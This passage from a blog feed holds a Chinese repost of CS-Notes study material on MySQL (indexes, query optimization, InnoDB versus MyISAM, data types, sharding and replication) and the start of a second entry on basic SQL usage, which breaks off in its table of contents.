      <link href="/2018/12/24/shu-ju-ku/mysql/"/>
      <url>/2018/12/24/shu-ju-ku/mysql/</url>
      
        <content type="html"><![CDATA[<h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><ul><li>一、索引<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/MySQL.md#b-tree-%E5%8E%9F%E7%90%86">B+ Tree 原理</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/MySQL.md#mysql-%E7%B4%A2%E5%BC%95">MySQL 索引</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/MySQL.md#%E7%B4%A2%E5%BC%95%E4%BC%98%E5%8C%96">索引优化</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/MySQL.md#%E7%B4%A2%E5%BC%95%E7%9A%84%E4%BC%98%E7%82%B9">索引的优点</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/MySQL.md#%E7%B4%A2%E5%BC%95%E7%9A%84%E4%BD%BF%E7%94%A8%E6%9D%A1%E4%BB%B6">索引的使用条件</a></li></ul></li><li>二、查询性能优化<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/MySQL.md#%E4%BD%BF%E7%94%A8-explain-%E8%BF%9B%E8%A1%8C%E5%88%86%E6%9E%90">使用 Explain 进行分析</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/MySQL.md#%E4%BC%98%E5%8C%96%E6%95%B0%E6%8D%AE%E8%AE%BF%E9%97%AE">优化数据访问</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/MySQL.md#%E9%87%8D%E6%9E%84%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F">重构查询方式</a></li></ul></li><li>三、存储引擎<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/MySQL.md#innodb">InnoDB</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/MySQL.md#myisam">MyISAM</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/MySQL.md#%E6%AF%94%E8%BE%83">比较</a></li></ul></li><li>四、数据类型<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/MySQL.md#%E6%95%B4%E5%9E%8B">整型</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/MySQL.md#%E6%B5%AE%E7%82%B9%E6%95%B0">浮点数</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/MySQL.md#%E5%AD%97%E7%AC%A6%E4%B8%B2">字符串</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/MySQL.md#%E6%97%B6%E9%97%B4%E5%92%8C%E6%97%A5%E6%9C%9F">时间和日期</a></li></ul></li><li>五、切分<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/MySQL.md#%E6%B0%B4%E5%B9%B3%E5%88%87%E5%88%86">水平切分</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/MySQL.md#%E5%9E%82%E7%9B%B4%E5%88%87%E5%88%86">垂直切分</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/MySQL.md#sharding-%E7%AD%96%E7%95%A5">Sharding 策略</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/MySQL.md#sharding-%E5%AD%98%E5%9C%A8%E7%9A%84%E9%97%AE%E9%A2%98">Sharding 存在的问题</a></li></ul></li><li>六、复制<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/MySQL.md#%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6">主从复制</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/MySQL.md#%E8%AF%BB%E5%86%99%E5%88%86%E7%A6%BB">读写分离</a></li></ul></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/MySQL.md#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99">参考资料</a></li></ul><h1 id="一、索引"><a href="#一、索引" class="headerlink" title="一、索引"></a>一、索引</h1><h2 id="B-Tree-原理"><a href="#B-Tree-原理" class="headerlink" title="B+ Tree 原理"></a>B+ Tree 原理</h2><h3 id="1-数据结构"><a href="#1-数据结构" class="headerlink" title="1. 数据结构"></a>1. 数据结构</h3><p>B Tree 指的是 Balance Tree，也就是平衡树。平衡树是一颗查找树，并且所有叶子节点位于同一层。</p><p>B+ Tree 是基于 B Tree 和叶子节点顺序访问指针进行实现，它具有 B Tree 的平衡性，并且通过顺序访问指针来提高区间查询的性能。</p><p>在 B+ Tree 中，一个节点中的 key 从左到右非递减排列，如果某个指针的左右相邻 key 分别是 keyi 和 keyi+1，且不为 null，则该指针指向节点的所有 key 大于等于 keyi 且小于等于 keyi+1。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/061c88c1-572f-424f-b580-9cbce903a3fe.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/061c88c1-572f-424f-b580-9cbce903a3fe.png" alt="img"></a></p><h3 id="2-操作"><a href="#2-操作" class="headerlink" title="2. 操作"></a>2. 操作</h3><p>进行查找操作时，首先在根节点进行二分查找，找到一个 key 所在的指针，然后递归地在指针所指向的节点进行查找。直到查找到叶子节点，然后在叶子节点上进行二分查找，找出 key 所对应的 data。</p><p>插入删除操作会破坏平衡树的平衡性，因此在插入删除操作之后，需要对树进行一个分裂、合并、旋转等操作来维护平衡性。</p><h3 id="3-与红黑树的比较"><a href="#3-与红黑树的比较" class="headerlink" title="3. 与红黑树的比较"></a>3. 与红黑树的比较</h3><p>红黑树等平衡树也可以用来实现索引，但是文件系统及数据库系统普遍采用 B+ Tree 作为索引结构，主要有以下两个原因：</p><p>（一）更少的查找次数</p><p>平衡树查找操作的时间复杂度等于树高 h，而树高大致为 O(h)=O(logdN)，其中 d 为每个节点的出度。</p><p>红黑树的出度为 2，而 B+ Tree 的出度一般都非常大，所以红黑树的树高 h 很明显比 B+ Tree 大非常多，查找的次数也就更多。</p><p>（二）利用磁盘预读特性</p><p>为了减少磁盘 I/O，磁盘往往不是严格按需读取，而是每次都会预读。预读过程中，磁盘进行顺序读取，顺序读取不需要进行磁盘寻道，并且只需要很短的旋转时间，速度会非常快。</p><p>操作系统一般将内存和磁盘分割成固态大小的块，每一块称为一页，内存与磁盘以页为单位交换数据。数据库系统将索引的一个节点的大小设置为页的大小，使得一次 I/O 就能完全载入一个节点。并且可以利用预读特性，相邻的节点也能够被预先载入。</p><h2 id="MySQL-索引"><a href="#MySQL-索引" class="headerlink" title="MySQL 索引"></a>MySQL 索引</h2><p>索引是在存储引擎层实现的，而不是在服务器层实现的，所以不同存储引擎具有不同的索引类型和实现。</p><h3 id="1-B-Tree-索引"><a href="#1-B-Tree-索引" class="headerlink" title="1. B+Tree 索引"></a>1. B+Tree 索引</h3><p>是大多数 MySQL 存储引擎的默认索引类型。</p><p>因为不再需要进行全表扫描，只需要对树进行搜索即可，所以查找速度快很多。</p><p>除了用于查找，还可以用于排序和分组。</p><p>可以指定多个列作为索引列，多个索引列共同组成键。</p><p>适用于全键值、键值范围和键前缀查找，其中键前缀查找只适用于最左前缀查找。如果不是按照索引列的顺序进行查找，则无法使用索引。</p><p>InnoDB 的 B+Tree 索引分为主索引和辅助索引。主索引的叶子节点 data 域记录着完整的数据记录，这种索引方式被称为聚簇索引。因为无法把数据行存放在两个不同的地方，所以一个表只能有一个聚簇索引。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/c28c6fbc-2bc1-47d9-9b2e-cf3d4034f877.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/c28c6fbc-2bc1-47d9-9b2e-cf3d4034f877.jpg" alt="img"></a></p><p>辅助索引的叶子节点的 data 域记录着主键的值，因此在使用辅助索引进行查找时，需要先查找到主键值，然后再到主索引中进行查找。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/7ab8ca28-2a41-4adf-9502-cc0a21e63b51.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/7ab8ca28-2a41-4adf-9502-cc0a21e63b51.jpg" alt="img"></a></p><h3 id="2-哈希索引"><a href="#2-哈希索引" class="headerlink" title="2. 哈希索引"></a>2. 哈希索引</h3><p>哈希索引能以 O(1) 时间进行查找，但是失去了有序性：</p><ul><li>无法用于排序与分组；</li><li>只支持精确查找，无法用于部分查找和范围查找。</li></ul><p>InnoDB 存储引擎有一个特殊的功能叫“自适应哈希索引”，当某个索引值被使用的非常频繁时，会在 B+Tree 索引之上再创建一个哈希索引，这样就让 B+Tree 索引具有哈希索引的一些优点，比如快速的哈希查找。</p><h3 id="3-全文索引"><a href="#3-全文索引" class="headerlink" title="3. 全文索引"></a>3. 全文索引</h3><p>MyISAM 存储引擎支持全文索引，用于查找文本中的关键词，而不是直接比较是否相等。</p><p>查找条件使用 MATCH AGAINST，而不是普通的 WHERE。</p><p>全文索引使用倒排索引实现，它记录着关键词到其所在文档的映射。</p><p>InnoDB 存储引擎在 MySQL 5.6.4 版本中也开始支持全文索引。</p><h3 id="4-空间数据索引"><a href="#4-空间数据索引" class="headerlink" title="4. 空间数据索引"></a>4. 空间数据索引</h3><p>MyISAM 存储引擎支持空间数据索引（R-Tree），可以用于地理数据存储。空间数据索引会从所有维度来索引数据，可以有效地使用任意维度来进行组合查询。</p><p>必须使用 GIS 相关的函数来维护数据。</p><h2 id="索引优化"><a href="#索引优化" class="headerlink" title="索引优化"></a>索引优化</h2><h3 id="1-独立的列"><a href="#1-独立的列" class="headerlink" title="1. 独立的列"></a>1. 独立的列</h3><p>在进行查询时，索引列不能是表达式的一部分，也不能是函数的参数，否则无法使用索引。</p><p>例如下面的查询不能使用 actor_id 列的索引：</p><pre><code>SELECT actor_id FROM sakila.actor WHERE actor_id + 1 = 5;</code></pre><h3 id="2-多列索引"><a href="#2-多列索引" class="headerlink" title="2. 多列索引"></a>2. 多列索引</h3><p>在需要使用多个列作为条件进行查询时，使用多列索引比使用多个单列索引性能更好。例如下面的语句中，最好把 actor_id 和 film_id 设置为多列索引。</p><pre><code>SELECT film_id, actor_ id FROM sakila.film_actorWHERE actor_id = 1 AND film_id = 1;</code></pre><h3 id="3-索引列的顺序"><a href="#3-索引列的顺序" class="headerlink" title="3. 索引列的顺序"></a>3. 索引列的顺序</h3><p>让选择性最强的索引列放在前面。</p><p>索引的选择性是指：不重复的索引值和记录总数的比值。最大值为 1，此时每个记录都有唯一的索引与其对应。选择性越高，查询效率也越高。</p><p>例如下面显示的结果中 customer_id 的选择性比 staff_id 更高，因此最好把 customer_id 列放在多列索引的前面。</p><pre><code>SELECT COUNT(DISTINCT staff_id)/COUNT(*) AS staff_id_selectivity,COUNT(DISTINCT customer_id)/COUNT(*) AS customer_id_selectivity,COUNT(*)FROM payment;   staff_id_selectivity: 0.0001customer_id_selectivity: 0.0373               COUNT(*): 16049</code></pre><h3 id="4-前缀索引"><a href="#4-前缀索引" class="headerlink" title="4. 前缀索引"></a>4. 前缀索引</h3><p>对于 BLOB、TEXT 和 VARCHAR 类型的列，必须使用前缀索引，只索引开始的部分字符。</p><p>对于前缀长度的选取需要根据索引选择性来确定。</p><h3 id="5-覆盖索引"><a href="#5-覆盖索引" class="headerlink" title="5. 覆盖索引"></a>5. 覆盖索引</h3><p>索引包含所有需要查询的字段的值。</p><p>具有以下优点：</p><ul><li>索引通常远小于数据行的大小，只读取索引能大大减少数据访问量。</li><li>一些存储引擎（例如 MyISAM）在内存中只缓存索引，而数据依赖于操作系统来缓存。因此，只访问索引可以不使用系统调用（通常比较费时）。</li><li>对于 InnoDB 引擎，若辅助索引能够覆盖查询，则无需访问主索引。</li></ul><h2 id="索引的优点"><a href="#索引的优点" class="headerlink" title="索引的优点"></a>索引的优点</h2><ul><li>大大减少了服务器需要扫描的数据行数。</li><li>帮助服务器避免进行排序和分组，以及避免创建临时表（B+Tree 索引是有序的，可以用于 ORDER BY 和 GROUP BY 操作。临时表主要是在排序和分组过程中创建，因为不需要排序和分组，也就不需要创建临时表）。</li><li>将随机 I/O 变为顺序 I/O（B+Tree 索引是有序的，会将相邻的数据都存储在一起）。</li></ul><h2 id="索引的使用条件"><a href="#索引的使用条件" class="headerlink" title="索引的使用条件"></a>索引的使用条件</h2><ul><li>对于非常小的表、大部分情况下简单的全表扫描比建立索引更高效；</li><li>对于中到大型的表，索引就非常有效；</li><li>但是对于特大型的表，建立和维护索引的代价将会随之增长。这种情况下，需要用到一种技术可以直接区分出需要查询的一组数据，而不是一条记录一条记录地匹配，例如可以使用分区技术。</li></ul><h1 id="二、查询性能优化"><a href="#二、查询性能优化" class="headerlink" title="二、查询性能优化"></a>二、查询性能优化</h1><h2 id="使用-Explain-进行分析"><a href="#使用-Explain-进行分析" class="headerlink" title="使用 Explain 进行分析"></a>使用 Explain 进行分析</h2><p>Explain 用来分析 SELECT 查询语句，开发人员可以通过分析 Explain 结果来优化查询语句。</p><p>比较重要的字段有：</p><ul><li>select_type : 查询类型，有简单查询、联合查询、子查询等</li><li>key : 使用的索引</li><li>rows : 扫描的行数</li></ul><h2 id="优化数据访问"><a href="#优化数据访问" class="headerlink" title="优化数据访问"></a>优化数据访问</h2><h3 id="1-减少请求的数据量"><a href="#1-减少请求的数据量" class="headerlink" title="1. 减少请求的数据量"></a>1. 减少请求的数据量</h3><ul><li>只返回必要的列：最好不要使用 SELECT * 语句。</li><li>只返回必要的行：使用 LIMIT 语句来限制返回的数据。</li><li>缓存重复查询的数据：使用缓存可以避免在数据库中进行查询，特别在要查询的数据经常被重复查询时，缓存带来的查询性能提升将会是非常明显的。</li></ul><h3 id="2-减少服务器端扫描的行数"><a href="#2-减少服务器端扫描的行数" class="headerlink" title="2. 减少服务器端扫描的行数"></a>2. 减少服务器端扫描的行数</h3><p>最有效的方式是使用索引来覆盖查询。</p><h2 id="重构查询方式"><a href="#重构查询方式" class="headerlink" title="重构查询方式"></a>重构查询方式</h2><h3 id="1-切分大查询"><a href="#1-切分大查询" class="headerlink" title="1. 切分大查询"></a>1. 切分大查询</h3><p>一个大查询如果一次性执行的话，可能一次锁住很多数据、占满整个事务日志、耗尽系统资源、阻塞很多小的但重要的查询。</p><pre><code>DELETE FROM messages WHERE create &lt; DATE_SUB(NOW(), INTERVAL 3 MONTH);rows_affected = 0do {    rows_affected = do_query(    &quot;DELETE FROM messages WHERE create  &lt; DATE_SUB(NOW(), INTERVAL 3 MONTH) LIMIT 10000&quot;)} while rows_affected &gt; 0</code></pre><h3 id="2-分解大连接查询"><a href="#2-分解大连接查询" class="headerlink" title="2. 分解大连接查询"></a>2. 分解大连接查询</h3><p>将一个大连接查询分解成对每一个表进行一次单表查询，然后在应用程序中进行关联，这样做的好处有：</p><ul><li>让缓存更高效。对于连接查询，如果其中一个表发生变化，那么整个查询缓存就无法使用。而分解后的多个查询，即使其中一个表发生变化，对其它表的查询缓存依然可以使用。</li><li>分解成多个单表查询，这些单表查询的缓存结果更可能被其它查询使用到，从而减少冗余记录的查询。</li><li>减少锁竞争；</li><li>在应用层进行连接，可以更容易对数据库进行拆分，从而更容易做到高性能和可伸缩。</li><li>查询本身效率也可能会有所提升。例如下面的例子中，使用 IN() 代替连接查询，可以让 MySQL 按照 ID 顺序进行查询，这可能比随机的连接要更高效。</li></ul><pre><code>SELECT * FROM tabJOIN tag_post ON tag_post.tag_id=tag.idJOIN post ON tag_post.post_id=post.idWHERE tag.tag=&#39;mysql&#39;;SELECT * FROM tag WHERE tag=&#39;mysql&#39;;SELECT * FROM tag_post WHERE tag_id=1234;SELECT * FROM post WHERE post.id IN (123,456,567,9098,8904);</code></pre><h1 id="三、存储引擎"><a href="#三、存储引擎" class="headerlink" title="三、存储引擎"></a>三、存储引擎</h1><h2 id="InnoDB"><a href="#InnoDB" class="headerlink" title="InnoDB"></a>InnoDB</h2><p>是 MySQL 默认的事务型存储引擎，只有在需要它不支持的特性时，才考虑使用其它存储引擎。</p><p>实现了四个标准的隔离级别，默认级别是可重复读（REPEATABLE READ）。在可重复读隔离级别下，通过多版本并发控制（MVCC）+ 间隙锁（Next-Key Locking）防止幻影读。</p><p>主索引是聚簇索引，在索引中保存了数据，从而避免直接读取磁盘，因此对查询性能有很大的提升。</p><p>内部做了很多优化，包括从磁盘读取数据时采用的可预测性读、能够加快读操作并且自动创建的自适应哈希索引、能够加速插入操作的插入缓冲区等。</p><p>支持真正的在线热备份。其它存储引擎不支持在线热备份，要获取一致性视图需要停止对所有表的写入，而在读写混合场景中，停止写入可能也意味着停止读取。</p><h2 id="MyISAM"><a href="#MyISAM" class="headerlink" title="MyISAM"></a>MyISAM</h2><p>设计简单，数据以紧密格式存储。对于只读数据，或者表比较小、可以容忍修复操作，则依然可以使用它。</p><p>提供了大量的特性，包括压缩表、空间数据索引等。</p><p>不支持事务。</p><p>不支持行级锁，只能对整张表加锁，读取时会对需要读到的所有表加共享锁，写入时则对表加排它锁。但在表有读取操作的同时，也可以往表中插入新的记录，这被称为并发插入（CONCURRENT INSERT）。</p><p>可以手工或者自动执行检查和修复操作，但是和事务恢复以及崩溃恢复不同，可能导致一些数据丢失，而且修复操作是非常慢的。</p><p>如果指定了 DELAY_KEY_WRITE 选项，在每次修改执行完成时，不会立即将修改的索引数据写入磁盘，而是会写到内存中的键缓冲区，只有在清理键缓冲区或者关闭表的时候才会将对应的索引块写入磁盘。这种方式可以极大的提升写入性能，但是在数据库或者主机崩溃时会造成索引损坏，需要执行修复操作。</p><h2 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h2><ul><li>事务：InnoDB 是事务型的，可以使用 Commit 和 Rollback 语句。</li><li>并发：MyISAM 只支持表级锁，而 InnoDB 还支持行级锁。</li><li>外键：InnoDB 支持外键。</li><li>备份：InnoDB 支持在线热备份。</li><li>崩溃恢复：MyISAM 崩溃后发生损坏的概率比 InnoDB 高很多，而且恢复的速度也更慢。</li><li>其它特性：MyISAM 支持压缩表和空间数据索引。</li></ul><h1 id="四、数据类型"><a href="#四、数据类型" class="headerlink" title="四、数据类型"></a>四、数据类型</h1><h2 id="整型"><a href="#整型" class="headerlink" title="整型"></a>整型</h2><p>TINYINT, SMALLINT, MEDIUMINT, INT, BIGINT 分别使用 8, 16, 24, 32, 64 位存储空间，一般情况下越小的列越好。</p><p>INT(11) 中的数字只是规定了交互工具显示字符的个数，对于存储和计算来说是没有意义的。</p><h2 id="浮点数"><a href="#浮点数" class="headerlink" title="浮点数"></a>浮点数</h2><p>FLOAT 和 DOUBLE 为浮点类型，DECIMAL 为高精度小数类型。CPU 原生支持浮点运算，但是不支持 DECIMAl 类型的计算，因此 DECIMAL 的计算比浮点类型需要更高的代价。</p><p>FLOAT、DOUBLE 和 DECIMAL 都可以指定列宽，例如 DECIMAL(18, 9) 表示总共 18 位，取 9 位存储小数部分，剩下 9 位存储整数部分。</p><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>主要有 CHAR 和 VARCHAR 两种类型，一种是定长的，一种是变长的。</p><p>VARCHAR 这种变长类型能够节省空间，因为只需要存储必要的内容。但是在执行 UPDATE 时可能会使行变得比原来长，当超出一个页所能容纳的大小时，就要执行额外的操作。MyISAM 会将行拆成不同的片段存储，而 InnoDB 则需要分裂页来使行放进页内。</p><p>在进行存储和检索时，会保留 VARCHAR 末尾的空格，而会删除 CHAR 末尾的空格。</p><h2 id="时间和日期"><a href="#时间和日期" class="headerlink" title="时间和日期"></a>时间和日期</h2><p>MySQL 提供了两种相似的日期时间类型：DATETIME 和 TIMESTAMP。</p><h3 id="1-DATETIME"><a href="#1-DATETIME" class="headerlink" title="1. DATETIME"></a>1. DATETIME</h3><p>能够保存从 1001 年到 9999 年的日期和时间，精度为秒，使用 8 字节的存储空间。</p><p>它与时区无关。</p><p>默认情况下，MySQL 以一种可排序的、无歧义的格式显示 DATETIME 值，例如“2008-01-16 22:37:08”，这是 ANSI 标准定义的日期和时间表示方法。</p><h3 id="2-TIMESTAMP"><a href="#2-TIMESTAMP" class="headerlink" title="2. TIMESTAMP"></a>2. TIMESTAMP</h3><p>和 UNIX 时间戳相同，保存从 1970 年 1 月 1 日午夜（格林威治时间）以来的秒数，使用 4 个字节，只能表示从 1970 年到 2038 年。</p><p>它和时区有关，也就是说一个时间戳在不同的时区所代表的具体时间是不同的。</p><p>MySQL 提供了 FROM_UNIXTIME() 函数把 UNIX 时间戳转换为日期，并提供了 UNIX_TIMESTAMP() 函数把日期转换为 UNIX 时间戳。</p><p>默认情况下，如果插入时没有指定 TIMESTAMP 列的值，会将这个值设置为当前时间。</p><p>应该尽量使用 TIMESTAMP，因为它比 DATETIME 空间效率更高。</p><h1 id="五、切分"><a href="#五、切分" class="headerlink" title="五、切分"></a>五、切分</h1><h2 id="水平切分"><a href="#水平切分" class="headerlink" title="水平切分"></a>水平切分</h2><p>水平切分又称为 Sharding，它是将同一个表中的记录拆分到多个结构相同的表中。</p><p>当一个表的数据不断增多时，Sharding 是必然的选择，它可以将数据分布到集群的不同节点上，从而缓存单个数据库的压力。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/63c2909f-0c5f-496f-9fe5-ee9176b31aba.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/63c2909f-0c5f-496f-9fe5-ee9176b31aba.jpg" alt="img"></a></p><h2 id="垂直切分"><a href="#垂直切分" class="headerlink" title="垂直切分"></a>垂直切分</h2><p>垂直切分是将一张表按列切分成多个表，通常是按照列的关系密集程度进行切分，也可以利用垂直切分将经常被使用的列和不经常被使用的列切分到不同的表中。</p><p>在数据库的层面使用垂直切分将按数据库中表的密集程度部署到不同的库中，例如将原来的电商数据库垂直切分成商品数据库、用户数据库等。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/e130e5b8-b19a-4f1e-b860-223040525cf6.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/e130e5b8-b19a-4f1e-b860-223040525cf6.jpg" alt="img"></a></p><h2 id="Sharding-策略"><a href="#Sharding-策略" class="headerlink" title="Sharding 策略"></a>Sharding 策略</h2><ul><li>哈希取模：hash(key) % N；</li><li>范围：可以是 ID 范围也可以是时间范围；</li><li>映射表：使用单独的一个数据库来存储映射关系。</li></ul><h2 id="Sharding-存在的问题"><a href="#Sharding-存在的问题" class="headerlink" title="Sharding 存在的问题"></a>Sharding 存在的问题</h2><h3 id="1-事务问题"><a href="#1-事务问题" class="headerlink" title="1. 事务问题"></a>1. 事务问题</h3><p>使用分布式事务来解决，比如 XA 接口。</p><h3 id="2-连接"><a href="#2-连接" class="headerlink" title="2. 连接"></a>2. 连接</h3><p>可以将原来的连接分解成多个单表查询，然后在用户程序中进行连接。</p><h3 id="3-ID-唯一性"><a href="#3-ID-唯一性" class="headerlink" title="3. ID 唯一性"></a>3. ID 唯一性</h3><ul><li>使用全局唯一 ID（GUID）</li><li>为每个分片指定一个 ID 范围</li><li>分布式 ID 生成器 (如 Twitter 的 Snowflake 算法)</li></ul><h1 id="六、复制"><a href="#六、复制" class="headerlink" title="六、复制"></a>六、复制</h1><h2 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h2><p>主要涉及三个线程：binlog 线程、I/O 线程和 SQL 线程。</p><ul><li><strong>binlog 线程</strong> ：负责将主服务器上的数据更改写入二进制日志（Binary log）中。</li><li><strong>I/O 线程</strong> ：负责从主服务器上读取二进制日志，并写入从服务器的重放日志（Replay log）中。</li><li><strong>SQL 线程</strong> ：负责读取重放日志并重放其中的 SQL 语句。</li></ul><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/master-slave.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/master-slave.png" alt="img"></a></p><h2 id="读写分离"><a href="#读写分离" class="headerlink" title="读写分离"></a>读写分离</h2><p>主服务器处理写操作以及实时性要求比较高的读操作，而从服务器处理读操作。</p><p>读写分离能提高性能的原因在于：</p><ul><li>主从服务器负责各自的读和写，极大程度缓解了锁的争用；</li><li>从服务器可以使用 MyISAM，提升查询性能以及节约系统开销；</li><li>增加冗余，提高可用性。</li></ul><p>读写分离常用代理方式来实现，代理服务器接收应用层传来的读写请求，然后决定转发到哪个服务器。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/master-slave-proxy.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/master-slave-proxy.png" alt="img"></a></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li>BaronScbwartz, PeterZaitsev, VadimTkacbenko, 等. 高性能 MySQL[M]. 电子工业出版社, 2013.</li><li>姜承尧. MySQL 技术内幕: InnoDB 存储引擎 [M]. 机械工业出版社, 2011.</li><li><a href="https://www.jfox.info/20-tiao-mysql-xing-nen-you-hua-de-zui-jia-jing-yan.html" target="_blank" rel="noopener">20+ 条 MySQL 性能优化的最佳经验</a></li><li><a href="http://blog.720ui.com/2017/mysql_core_09_multi_db_table2/" target="_blank" rel="noopener">服务端指南 数据存储篇 | MySQL（09） 分库与分表带来的分布式困境与应对之策</a></li><li><a href="https://stackoverflow.com/questions/788829/how-to-create-unique-row-id-in-sharded-databases" target="_blank" rel="noopener">How to create unique row ID in sharded databases?</a></li><li><a href="http://geekswithblogs.net/shaunxu/archive/2012/01/07/sql-azure-federation-ndash-introduction.aspx" target="_blank" rel="noopener">SQL Azure Federation – Introduction</a></li><li><a href="http://blog.codinglabs.org/articles/theory-of-mysql-index.html" target="_blank" rel="noopener">MySQL 索引背后的数据结构及算法原理</a></li><li><a href="https://segmentfault.com/a/1190000008131735" target="_blank" rel="noopener">MySQL 性能优化神器 Explain 使用分析</a></li><li><a href="https://medium.com/@jeeyoungk/how-sharding-works-b4dec46b3f6" target="_blank" rel="noopener">How Sharding Works</a></li><li><a href="https://tech.meituan.com/dianping_order_db_sharding.html" target="_blank" rel="noopener">大众点评订单系统分库分表实践</a></li></ul><p>本文转载自:<a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/MySQL.md">https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/MySQL.md</a></p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL基本使用</title>
      <link href="/2018/12/24/shu-ju-ku/sql-ji-ben-shi-yong/"/>
      <url>/2018/12/24/shu-ju-ku/sql-ji-ben-shi-yong/</url>
      
        <content type="html"><![CDATA[<h2 id="SQL基本使用"><a href="#SQL基本使用" class="headerlink" title="SQL基本使用"></a>SQL基本使用</h2><ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/SQL.md#%E4%B8%80%E5%9F%BA%E7%A1%80">一、基础</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/SQL.md#%E4%BA%8C%E5%88%9B%E5%BB%BA%E8%A1%A8">二、创建表</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/SQL.md#%E4%B8%89%E4%BF%AE%E6%94%B9%E8%A1%A8">三、修改表</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/SQL.md#%E5%9B%9B%E6%8F%92%E5%85%A5">四、插入</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/SQL.md#%E4%BA%94%E6%9B%B4%E6%96%B0">五、更新</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/SQL.md#%E5%85%AD%E5%88%A0%E9%99%A4">六、删除</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/SQL.md#%E4%B8%83%E6%9F%A5%E8%AF%A2">七、查询</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/SQL.md#%E5%85%AB%E6%8E%92%E5%BA%8F">八、排序</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/SQL.md#%E4%B9%9D%E8%BF%87%E6%BB%A4">九、过滤</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/SQL.md#%E5%8D%81%E9%80%9A%E9%85%8D%E7%AC%A6">十、通配符</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/SQL.md#%E5%8D%81%E4%B8%80%E8%AE%A1%E7%AE%97%E5%AD%97%E6%AE%B5">十一、计算字段</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/SQL.md#%E5%8D%81%E4%BA%8C%E5%87%BD%E6%95%B0">十二、函数</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/SQL.md#%E5%8D%81%E4%B8%89%E5%88%86%E7%BB%84">十三、分组</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/SQL.md#%E5%8D%81%E5%9B%9B%E5%AD%90%E6%9F%A5%E8%AF%A2">十四、子查询</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/SQL.md#%E5%8D%81%E4%BA%94%E8%BF%9E%E6%8E%A5">十五、连接</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/SQL.md#%E5%8D%81%E5%85%AD%E7%BB%84%E5%90%88%E6%9F%A5%E8%AF%A2">十六、组合查询</a></li><li><a 